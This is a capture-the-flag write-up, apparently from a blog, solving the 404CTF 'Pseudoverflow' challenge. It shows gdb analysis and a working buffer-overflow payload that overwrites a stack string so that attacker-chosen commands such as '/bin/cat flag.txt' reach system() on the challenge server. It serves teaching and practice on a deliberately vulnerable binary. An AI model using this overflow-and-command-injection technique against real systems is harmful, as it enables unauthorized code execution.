---
layout: Post
type: chall
---
# Pseudoverflow ⚪

<a class="back-link" href="../../">< Go back</a>

## Description

Course annuelle

Bienvenue à tous dans la course annuelle du 404CTF : les inscriptions sont ouvertes !! Votre pseudo sera-t-il à la hauteur de nos attentes ?

Objectif: lire le fichier flag.txt

Connexion :
`nc challenges.404ctf.fr 31958`

all files in [resources/](./resources) were provided.

## Challenge

### Recon

I first tried debugging the application using binary ninja (Free) but ended up going to gdb as it's easier to play with long inputs (you can run `shell python` for example)

Let's first just look at the decompiled code (High Level IL) of the program and get a general idea of what we can exploit:

```c
int64_t win(char* arg1)
    return system(line: arg1)

int32_t main(int32_t argc, char** argv, char** envp)
    setvbuf(fp: stdin, buf: nullptr, mode: 2, size: 0)
    setvbuf(fp: __bss_start, buf: nullptr, mode: 2, size: 0)
    setvbuf(fp: stderr, buf: nullptr, mode: 2, size: 0)
    int32_t var_e
    __builtin_strcpy(dest: &var_e, src: "perds")
    puts(str: &data_2008)
    void buf
    fgets(buf: &buf, n: 0x100, fp: stdin)
    if (strcmp(&var_e, "gagne") != 0)
        puts(str: "Nous vous recontacterons dans le…")
    else
        win(&buf)
    return 0
```

As we can see, our objective is to call `win()` which takes an argument and executes it using `system()` this is pretty much a revshell.

To be able to call `win()` we first have to match `&var_e` to `"gagne"` as they get `strcmp()`, though we cannot modify `&var_e` directly and it's set to `"perds"`.

We can only interact with `buf` which is the buffer we write to from `fgets()` with a maximum of 256 chars.

Okay let's go into gdb now.

```bash
gdb ./resources/course
(gdb) disas main
# [...]
# 0x0000555555555225 <+145>:   call   0x555555555050 <fgets@plt>
# 0x000055555555522a <+150>:   lea    -0x6(%rbp),%rax
# [...]
# 0x0000555555555238 <+164>:   mov    %rax,%rdi
# 0x000055555555523b <+167>:   call   0x555555555060 <strcmp@plt>
# [...]
(gdb) br *main+145
(gdb) br *main+150
(gdb) br *main+164
```

These 3 breakpoints this will help us keep up with the flow of the program easily, we are monitoring before and after the `fgets` call, and before the `strcmp` call.

Let's also setup some basic `xxd` to view the raw memory as we are probably going to have to deal with buffer overflows (I got this trick from this [stackoverflow post](https://stackoverflow.com/a/9234007/14578266)):

```bash
(gdb) define xxd
>dump binary memory dump.bin $arg0 $arg0+$arg1
>shell xxd dump.bin
>end
# USAGE: xxd <obj> <size>
# i.e.:  xxd $rax  200
```

Okay let's start.

```bash
(gdb) r
# Bienvenue à la course annuelle du 404CTF!!
# Pour pouvoir participer, nous avons besoin de votre pseudo :

# Breakpoint 1, 0x0000555555555225 in main ()
(gdb) c
# Continuing.
AAAA               # <---------- Our input

# Breakpoint 2, 0x000055555555522a in main ()
(gdb) xxd $rax 170
# 00000000: 4141 4141 0a00 0000 4000 0000 0000 0000  AAAA....@.......
# 00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
# 00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
# 00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
# 00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
# 00000050: 0000 0000 0000 0000 0069 fef7 ff7f 0000  .........i......
# 00000060: 0000 0000 0000 0000 b0da 7065 7264 7300  ..........perds.
# 00000070: 0100 0000 0000 0000 ca06 dff7 ff7f 0000  ................
# 00000080: 20de ffff ff7f 0000 9451 5555 5555 0000   ........QUUUU..
# 00000090: 4040 5555 0100 0000 38de ffff ff7f 0000  @@UU....8.......
# 000000a0: 38de ffff ff7f 0000 104f                 8........O
```

In this hexdump we see that there is a `"perds"` string at `$rax+0x6b` this is probably `&var_e`.

### Creating the payload

Okay so we have to create a payload that will pad `106` characters (`0x6b - 1`) and then write `"gagne"` over the `"perds"`. Then on top of that we need to have our shell payload at the start.

```bash
(gdb) shell python -c 'import os; os.write(1, b"/bin/ls\x00" + b"A" * 98 + b"gagne\x00\x0a")' > payload.bin
```

Let's break this down, here is the hexdump of the payload

```
00000000: 2f62 696e 2f6c 7300 4141 4141 4141 4141  /bin/ls.AAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 6761 676e 6500  AAAAAAAAAAgagne.
00000070: 0a                                       .
```

Let's break this down.

- As you can see we start with our shell command `/bin/ls`
- then a null byte `\x00` to "finish" that buffer in the eyes of `strcmp()`
- then our `AAAA` padding
- then at exactly `+0x6b` our string `"gagne"`
- then another null byte `\x00`
- finally a line break `\x0a` (This is because stdin is in line buffered mode)

If we run that in gdb:

```bash
(gdb) r < payload.bin
# Bienvenue à la course annuelle du 404CTF!!
# Pour pouvoir participer, nous avons besoin de votre pseudo :

# Breakpoint 1, 0x0000555555555225 in main ()
(gdb) c
# Continuing.

# Breakpoint 2, 0x000055555555522a in main ()
(gdb) c
# Continuing.

# Breakpoint 3, 0x0000555555555238 in main ()
(gdb) c
# Continuing.
# [Detaching after vfork from child process 260556]
# course  dump.bin  payload.bin
```

And we got our `ls`, let's do the same now but trough netcat to the actual challenge binary that has the flag.

For this I adapted the appraoch to a python script [pwn_nc.py](./pwn_nc.py) (From `ls` we learn that there is a `flag.txt` file)

```bash
python3 pwn_nc.py
# [*] Payload: b'/bin/cat flag.txt\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgagne\x00\n'
# [+] Opening connection to challenges.404ctf.fr on port 31958: Done
# Bienvenue à la course annuelle du 404CTF!!

# Pour pouvoir participer, nous avons besoin de votre pseudo :

# [+] Receiving all data: Done (16B)
# [*] Closed connection to challenges.404ctf.fr port 31958
# b'404CTF{0v3rfl0w}'
```

Flag: `404CTF{0v3rfl0w}`
